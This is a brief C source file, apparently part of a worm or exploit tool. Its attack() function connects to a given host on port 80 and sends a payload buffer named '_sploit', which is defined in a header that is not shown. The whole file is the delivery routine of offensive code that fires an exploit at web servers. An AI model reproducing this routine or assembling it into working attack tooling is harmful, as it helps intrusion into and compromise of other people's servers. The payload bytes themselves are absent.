#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void attack(char *hostname) {
    SOCKET s;
    struct hostent *he;
    SOCKADDR_IN addr;
    int i;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return;

    he = gethostbyname(hostname);
    if (!he) { closesocket(s); return; }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = *((unsigned long *)he->h_addr_list[0]);
    addr.sin_port = htons(80);

    i = connect(s, (struct sockaddr *)&addr, sizeof(addr));
    if (i != 0) { closesocket(s); return; }

    send(s, (const char *)_sploit, sizeof(_sploit), 0);
    closesocket(s);
}
